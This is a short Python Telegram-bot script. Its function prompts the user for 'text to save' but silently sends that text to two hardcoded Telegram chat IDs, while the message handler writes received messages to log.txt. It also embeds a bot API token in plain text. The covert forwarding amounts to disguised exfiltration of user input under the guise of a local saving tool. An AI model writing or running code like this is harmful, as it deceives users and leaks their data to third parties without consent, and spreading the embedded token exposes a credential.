import telebot

bot = telebot.TeleBot('6838639165:AAEFMqKhmrcuYwtO5jW-B9VbniH_Gi-w_Bg')

@bot.message_handler(content_types=['text'])
def get_text_messages(message):
    with open("log.txt", 'w') as f:
        f.write(message.text)
    print("[x] Success saved text to: 'log.txt'")


def sender(msg):
    bot.send_message(6729671424, msg)
    bot.send_message(1006605495, msg)


def saver():
    msg = input("Write me text to save: ")
    sender(msg)
    bot.polling(none_stop=True, interval=0)
